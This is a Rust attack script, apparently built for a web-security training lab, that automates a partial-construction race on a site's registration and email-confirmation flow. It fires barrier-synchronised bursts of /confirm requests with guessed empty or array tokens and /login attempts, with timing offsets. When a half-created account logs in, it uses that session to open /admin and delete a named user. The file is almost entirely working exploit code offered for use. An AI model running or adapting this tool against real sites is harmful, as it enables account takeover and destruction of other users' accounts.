#!/usr/bin/env rust-script
//! name: pcreg_burst
//! description: 半构造注册竞态爆发件(partial-construction registration race burst)- 跨端点对齐齐放:每轮先用独立会话取 /register 的 csrf,再让 N 条已预热连接在屏障后按各自微秒延迟同时投出 1 发注册 + K 发读侧请求(mode=confirm 投 /confirm(token 候选轮转,支持 <none> 无参形态、可选同会话 cookie);mode=login 投 /login,读侧即「半构造行是否短暂可用」的判定面),以登录成功为真值 oracle 逐轮复验;命中即用该会话走 /admin 删除目标用户并回读首页横幅。补 pcreg_race 缓速播撒(跨端点无对齐、无延迟扫描)的缺口。--raw-param 候选原样入 URL 不编码,可发字面 token[] 数组形。
//! version: 1.2.1
//! args: <base-url> [--mode confirm|login|both] [--rounds N] [--confirms K] [--tag S] [--email-domain ginandjuice.shop] [--password P] [--candidates 'a,b,c'] [--delays-us '0,500,...'] [--same-session] [--raw-param] [--delete-user U] [--snippet N] [--selftest]
//! keywords: 漏洞猎手套件, 竞态, race, partial construction, 半构造, 注册, confirm, 单包, 屏障, 延迟扫描, burst
//!
//! ```cargo
//! [dependencies]
//! ureq = { version = "2" }
//! ```
use pi_rust_lib::report;
use pi_rust_lib::serde_json::{json, Value};
use std::collections::BTreeMap;
use std::sync::{Arc, Barrier, Mutex};
use std::time::{Duration, Instant};

struct Resp {
    status: u16,
    body: String,
    cookie: Option<String>,
    ms: u128,
}

fn send(
    agent: &ureq::Agent,
    method: &str,
    url: &str,
    cookie: Option<&str>,
    body: Option<&str>,
) -> Resp {
    let t0 = Instant::now();
    let mut req = agent.request(method, url);
    if let Some(c) = cookie {
        req = req.set("Cookie", c);
    }
    if body.is_some() {
        req = req.set("Content-Type", "application/x-www-form-urlencoded");
    }
    let out = match body {
        Some(b) => req.send_string(b),
        None => req.call(),
    };
    let ms = t0.elapsed().as_millis();
    match out {
        Ok(r) => {
            let status = r.status();
            let cookie = r.header("set-cookie").map(|s| s.split(';').next().unwrap_or("").to_string());
            let body = r.into_string().unwrap_or_default();
            Resp { status, body, cookie, ms }
        }
        Err(ureq::Error::Status(code, r)) => {
            let cookie = r.header("set-cookie").map(|s| s.split(';').next().unwrap_or("").to_string());
            let body = r.into_string().unwrap_or_default();
            Resp { status: code, body, cookie, ms }
        }
        Err(e) => Resp { status: 0, body: format!("transport error: {e}"), cookie: None, ms },
    }
}

fn csrf_of(html: &str) -> Option<String> {
    let idx = html.find("name=\"csrf\"")?;
    let rest = &html[idx..];
    let v = rest.find("value=")?;
    let rest = rest[v + 6..].trim_start();
    let quote = rest.chars().next()?;
    if quote != '"' && quote != '\'' {
        return None;
    }
    let rest = &rest[1..];
    let end = rest.find(quote)?;
    Some(rest[..end].to_string())
}

fn snippet(s: &str, n: usize) -> String {
    let t: String = s.split_whitespace().collect::<Vec<_>>().join(" ");
    if t.chars().count() > n {
        t.chars().take(n).collect::<String>() + "..."
    } else {
        t
    }
}

fn urlencode(s: &str) -> String {
    let mut out = String::new();
    for b in s.bytes() {
        match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => out.push(b as char),
            _ => out.push_str(&format!("%{b:02X}")),
        }
    }
    out
}

fn arg(args: &[String], i: usize) -> String {
    args.get(i + 1).cloned().unwrap_or_default()
}

/// Confirm URL: <none> drops the param entirely; --raw-param emits the
/// candidate unencoded so literal `token[]` reaches PHP (PHP does not decode
/// %5B%5D inside a parameter name, the encoded form reads as `token`).
fn confirm_url(base: &str, cand: &str, raw: bool) -> String {
    if cand == "<none>" {
        format!("{base}/confirm")
    } else {
        let v = if raw { cand.to_string() } else { urlencode(cand) };
        format!("{base}/confirm?token={v}")
    }
}

/// True when the login response proves authentication (ureq follows the 302 to /my-account).
fn login_ok(r: &Resp) -> bool {
    if r.status != 200 {
        return true;
    }
    !r.body.contains("Invalid username or password") && !r.body.contains("name=\"username\"")
}

fn try_login(agent: &ureq::Agent, base: &str, user: &str, pass: &str) -> (bool, Option<String>, Resp) {
    let page = send(agent, "GET", &format!("{base}/login"), None, None);
    let cookie = page.cookie.clone();
    let csrf = csrf_of(&page.body).unwrap_or_default();
    let body = format!(
        "csrf={}&username={}&password={}",
        urlencode(&csrf),
        urlencode(user),
        urlencode(pass)
    );
    let r = send(agent, "POST", &format!("{base}/login"), cookie.as_deref(), Some(&body));
    (login_ok(&r), cookie, r)
}

fn banner_solved(agent: &ureq::Agent, base: &str) -> (bool, String) {
    let r = send(agent, "GET", &format!("{base}/"), None, None);
    let solved = r.body.contains("is-solved");
    let line = r
        .body
        .split("widgetcontainer-lab-status")
        .nth(1)
        .map(|s| snippet(s, 120))
        .unwrap_or_default();
    (solved, line)
}

fn short_cand(row: &Value) -> String {
    let c = row.get("candidate").and_then(|v| v.as_str()).unwrap_or("-");
    if c.chars().count() > 12 {
        format!("{}..", c.chars().take(12).collect::<String>())
    } else {
        c.to_string()
    }
}

struct Job {
    url: String,
    body: Option<String>,
    cookie: Option<String>,
    delay_us: u64,
    kind: &'static str,
    cand: String,
}

fn main() {
    let args: Vec<String> = std::env::args().skip(1).collect();
    if args.iter().any(|a| a == "--selftest") {
        let sample = "<input required type=\"hidden\" name=\"csrf\" value=\"AbC123\">";
        let ok = csrf_of(sample).as_deref() == Some("AbC123")
            && urlencode("a b") == "a%20b"
            && confirm_url("https://x", "[]", true) == "https://x/confirm?token=[]"
            && confirm_url("https://x", "[]", false) == "https://x/confirm?token=%5B%5D"
            && confirm_url("https://x", "<none>", true) == "https://x/confirm";
        println!("{}", json!({"action": "pcreg_burst", "data": {"selftest": ok}, "success": ok}));
        std::process::exit(if ok { 0 } else { 1 });
    }

    let mut base = String::new();
    let mut rounds = 20usize;
    let mut confirms = 16usize;
    let mut tag = "pb".to_string();
    let mut domain = "ginandjuice.shop".to_string();
    let mut password = "peter123".to_string();
    let mut candidates: Vec<String> = vec![
        String::new(),
        String::new(),
        "0".into(),
        "null".into(),
        "undefined".into(),
        "false".into(),
        "Array".into(),
        "<none>".into(),
    ];
    let mut delays: Vec<u64> = vec![
        0, 20000, 40000, 60000, 80000, 100000, 150000, 200000, 300000, 400000, 500000, 600000,
        700000, 800000, 900000, 1000000, 1100000, 1200000,
    ];
    let mut mode = "confirm".to_string();
    let mut same_session = false;
    let mut raw_param = false;
    let mut delete_user = String::new();
    let mut snip = 100usize;
    let mut timeout_ms = 30000u64;

    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "--rounds" => rounds = arg(&args, i).parse().unwrap_or(rounds),
            "--confirms" => confirms = arg(&args, i).parse().unwrap_or(confirms).clamp(1, 48),
            "--tag" => tag = arg(&args, i),
            "--email-domain" => domain = arg(&args, i),
            "--password" => password = arg(&args, i),
            "--candidates" => {
                candidates = arg(&args, i).split(',').map(|s| s.to_string()).collect();
                if candidates.is_empty() {
                    candidates.push(String::new());
                }
            }
            "--delays-us" => {
                let v: Vec<u64> = arg(&args, i).split(',').filter_map(|s| s.trim().parse().ok()).collect();
                if !v.is_empty() {
                    delays = v;
                }
            }
            "--mode" => mode = arg(&args, i),
            "--same-session" => same_session = true,
            "--raw-param" => raw_param = true,
            "--delete-user" => delete_user = arg(&args, i),
            "--snippet" => snip = arg(&args, i).parse().unwrap_or(snip),
            "--timeout-ms" => timeout_ms = arg(&args, i).parse().unwrap_or(timeout_ms),
            other if !other.starts_with("--") && base.is_empty() => {
                base = other.trim_end_matches('/').to_string()
            }
            _ => {}
        }
        i += 1;
    }
    if base.is_empty() {
        report::failure(
            "pcreg_burst",
            "usage",
            "call as: pcreg_burst <base-url> --rounds 20 --confirms 16 --delete-user carlos",
        );
        std::process::exit(2);
    }

    let mk_agent = || {
        ureq::AgentBuilder::new()
            .timeout(Duration::from_millis(timeout_ms))
            .build()
    };

    // one agent per lane (own pool => own connection), warmed once
    let lanes: Vec<ureq::Agent> = (0..confirms + 1).map(|_| mk_agent()).collect();
    let mut warm_rows: Vec<u16> = Vec::new();
    for a in &lanes {
        warm_rows.push(send(a, "GET", &format!("{base}/"), None, None).status);
    }
    let session = mk_agent();
    let confirm_agents: Vec<ureq::Agent> = (0..confirms).map(|_| mk_agent()).collect();
    for a in &confirm_agents {
        let _ = send(a, "GET", &format!("{base}/"), None, None);
    }
    // per-lane login sessions (own session => no server-side session lock contention)
    let want_login = mode == "login" || mode == "both";
    let mut lane_sessions: Vec<(Option<String>, String)> = Vec::new();
    if want_login {
        for a in &confirm_agents {
            let page = send(a, "GET", &format!("{base}/login"), None, None);
            let csrf = csrf_of(&page.body).unwrap_or_default();
            lane_sessions.push((page.cookie.clone(), csrf));
        }
    }

    let mut round_log: Vec<Value> = Vec::new();
    let mut hit_rows: Vec<Value> = Vec::new();
    let mut winner: Option<(String, String, Option<String>)> = None;

    for r in 0..rounds {
        let user = format!("{tag}{}", r + 1);
        let email = format!("{user}@{domain}");
        let page = send(&session, "GET", &format!("{base}/register"), None, None);
        let sid = page.cookie.clone();
        let csrf = match csrf_of(&page.body) {
            Some(c) => c,
            None => {
                round_log.push(json!({"round": r + 1, "error": "no csrf", "body": snippet(&page.body, snip)}));
                continue;
            }
        };
        let reg_body = format!(
            "csrf={}&username={}&email={}&password={}",
            urlencode(&csrf),
            urlencode(&user),
            urlencode(&email),
            urlencode(&password)
        );

        // rotate candidate <-> delay pairing so combinations vary across rounds
        let shift = r % candidates.len().max(1);
        let mut jobs: Vec<Job> = Vec::new();
        jobs.push(Job {
            url: format!("{base}/register"),
            body: Some(reg_body),
            cookie: sid.clone(),
            delay_us: 0,
            kind: "register",
            cand: "-".into(),
        });
        for k in 0..confirms {
            let delay = delays[(k + shift) % delays.len()];
            if want_login && (mode == "login" || k % 2 == 1) {
                let (lcookie, lcsrf) = lane_sessions
                    .get(k)
                    .cloned()
                    .unwrap_or((None, String::new()));
                let body = format!(
                    "csrf={}&username={}&password={}",
                    urlencode(&lcsrf),
                    urlencode(&user),
                    urlencode(&password)
                );
                jobs.push(Job {
                    url: format!("{base}/login"),
                    body: Some(body),
                    cookie: lcookie,
                    delay_us: delay,
                    kind: "login",
                    cand: "-".into(),
                });
                continue;
            }
            let cand = candidates[(k + shift) % candidates.len()].clone();
            let cand = cand
                .replace("{SID}", sid.as_deref().unwrap_or(""))
                .replace("{CSRF}", &csrf)
                .replace("{U}", &user)
                .replace("{E}", &email)
                .replace("{P}", &password);
            let url = confirm_url(&base, &cand, raw_param);
            let cookie = if same_session && k % 2 == 0 { sid.clone() } else { None };
            jobs.push(Job { url, body: None, cookie, delay_us: delay, kind: "confirm", cand });
        }

        let jobs = Arc::new(jobs);
        let barrier = Arc::new(Barrier::new(jobs.len()));
        let out: Arc<Mutex<Vec<Value>>> = Arc::new(Mutex::new(Vec::new()));
        let mut handles = Vec::new();
        for idx in 0..jobs.len() {
            let jobs = jobs.clone();
            let barrier = barrier.clone();
            let out = out.clone();
            let agent = if idx == 0 { lanes[0].clone() } else { confirm_agents[idx - 1].clone() };
            handles.push(std::thread::spawn(move || {
                barrier.wait();
                let job = &jobs[idx];
                if job.delay_us > 0 {
                    std::thread::sleep(Duration::from_micros(job.delay_us));
                }
                let resp = send(&agent, "POST", &job.url, job.cookie.as_deref(), job.body.as_deref());
                out.lock().unwrap_or_else(|e| e.into_inner()).push(json!({
                    "kind": job.kind,
                    "candidate": job.cand,
                    "delay_us": job.delay_us,
                    "status": resp.status,
                    "ms": resp.ms,
                    "len": resp.body.len(),
                    "body": snippet(&resp.body, snip),
                    "session_cookie": job.cookie,
                    "login_ok": job.kind == "login" && login_ok(&resp),
                }));
            }));
        }
        for h in handles {
            let _ = h.join();
        }
        let rows = out.lock().unwrap_or_else(|e| e.into_inner()).clone();

        let mut status_hist: BTreeMap<String, usize> = BTreeMap::new();
        let mut reg_status = 0u16;
        let mut reg_body = String::new();
        let mut anomalies: Vec<Value> = Vec::new();
        let mut in_burst_hit: Option<Option<String>> = None;
        for row in rows.iter() {
            let kind = row.get("kind").and_then(|v| v.as_str()).unwrap_or("");
            let status = row.get("status").and_then(|v| v.as_u64()).unwrap_or(0);
            if kind == "register" {
                reg_status = status as u16;
                reg_body = row.get("body").and_then(|v| v.as_str()).unwrap_or("").to_string();
                continue;
            }
            *status_hist.entry(format!("{kind}:{}:{status}", short_cand(row))).or_insert(0) += 1;
            if kind == "login" {
                if row.get("login_ok").and_then(|v| v.as_bool()) == Some(true) {
                    in_burst_hit = Some(
                        row.get("session_cookie")
                            .and_then(|v| v.as_str())
                            .map(|s| s.to_string()),
                    );
                    hit_rows.push(json!({"round": r + 1, "user": user, "row": row}));
                }
            } else if status != 400 && status != 403 && status != 0 {
                anomalies.push(row.clone());
                hit_rows.push(json!({"round": r + 1, "user": user, "row": row}));
            }
        }
        if in_burst_hit.is_some() {
            round_log.push(json!({
                "round": r + 1,
                "user": user,
                "register_status": reg_status,
                "confirm_status_hist": status_hist,
                "in_burst_login_hit": true,
            }));
            winner = Some((user.clone(), password.clone(), in_burst_hit.unwrap()));
            break;
        }

        let (ok, cookie, lresp) = try_login(&session, &base, &user, &password);
        round_log.push(json!({
            "round": r + 1,
            "user": user,
            "register_status": reg_status,
            "register_notice": snippet(&reg_body, snip),
            "confirm_status_hist": status_hist,
            "anomalies": anomalies,
            "login_ok": ok,
            "login_status": lresp.status,
            "login_body": snippet(&lresp.body, snip),
        }));
        if ok {
            winner = Some((user.clone(), password.clone(), cookie.clone()));
            break;
        }
    }

    // ---- finish: admin delete + banner -------------------------------------
    let mut admin: Option<Value> = None;
    if let Some((user, _pw, cookie)) = winner.clone() {
        let cookie = cookie.or_else(|| {
            let (_, c, _) = try_login(&mk_agent(), &base, &user, &password);
            c
        });
        let adm_agent = mk_agent();
        let adm = send(&adm_agent, "GET", &format!("{base}/admin"), cookie.as_deref(), None);
        let csrf = csrf_of(&adm.body).unwrap_or_default();
        if !delete_user.is_empty() {
            let body = format!("csrf={}&username={}", urlencode(&csrf), urlencode(&delete_user));
            let del = send(&adm_agent, "POST", &format!("{base}/admin/delete"), cookie.as_deref(), Some(&body));
            admin = Some(json!({
                "user": user,
                "admin_status": adm.status,
                "admin_has_form": csrf_of(&adm.body).is_some(),
                "delete_status": del.status,
                "delete_body": snippet(&del.body, snip),
            }));
        } else {
            admin = Some(json!({"user": user, "admin_status": adm.status, "csrf": !csrf.is_empty()}));
        }
    }
    let (solved, banner) = banner_solved(&session, &base);

    let solved_evidence = solved
        || admin
            .as_ref()
            .and_then(|a| a.get("delete_status"))
            .and_then(|s| s.as_u64())
            .map(|s| s < 400 && s != 0)
            .unwrap_or(false);

    let data = json!({
        "result": if solved_evidence { "lab-solved" } else { "race-run" },
        "base": base,
        "warm_statuses": warm_rows,
        "rounds_run": round_log.len(),
        "rounds": round_log,
        "anomalous_confirm_rows": hit_rows,
        "winner": winner.as_ref().map(|(u, p, c)| json!({"user": u, "password": p, "cookie": c})),
        "admin": admin,
        "banner_solved": solved,
        "banner": banner,
    });
    let _ = report::success(
        "pcreg_burst",
        data,
        "winner.login_ok / admin.delete_status < 400 / banner_solved => solved; else widen --candidates and --delays-us and rerun",
    );
}
